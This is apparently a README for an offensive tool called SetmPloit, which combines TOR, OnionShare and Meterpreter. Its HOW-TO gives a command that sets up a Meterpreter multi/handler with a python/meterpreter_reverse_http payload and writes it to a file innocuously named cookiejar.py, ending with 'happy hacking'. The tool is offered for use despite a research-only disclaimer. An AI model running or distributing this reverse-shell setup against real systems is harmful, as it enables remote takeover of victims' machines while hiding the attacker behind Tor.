# SetmPloit

---
```text
This repository contains a Red team Offensive Security Exploitation Tool
which uses TOR and OnionShare as long with Meterpreter Session.

this project is for security testing and research use only! use at your own risk.
```
---
#### HOW-TO
```shell
$ git clone https://github.com/ToxicEnvelope/SetmPloit.git
$ /usr/bin/python -m venv venv
$ source venv/bin/activate
$ ./venv/bin/python -m pip install -r requirements.txt
$ ./venv/bin/python stemploit.py -oftp 1 -lh 127.0.0.1 -lp 5000 -rp 80 -ex exploit/multi/handler -p python/meterpreter_reverse_http -of cookiejar.py
```
---
happy hacking